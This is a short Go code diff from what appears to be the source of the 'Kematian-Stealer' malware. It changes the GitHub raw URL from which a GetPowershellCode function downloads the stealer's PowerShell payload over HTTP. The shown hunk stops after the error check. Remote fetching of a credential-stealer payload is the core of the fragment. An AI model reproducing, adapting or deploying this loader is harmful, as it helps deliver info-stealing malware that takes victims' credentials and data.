@@ -6,7 +6,7 @@ import (
 )
 
 func GetPowershellCode() string {
-	codeUrl := "https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/main.ps1"
+	codeUrl := "https://raw.githubusercontent.com/itzGlitxh/Kematian-Stealer/main/frontend-src/main.ps1"
 
 	res, err := http.Get(codeUrl)
 	if err != nil {
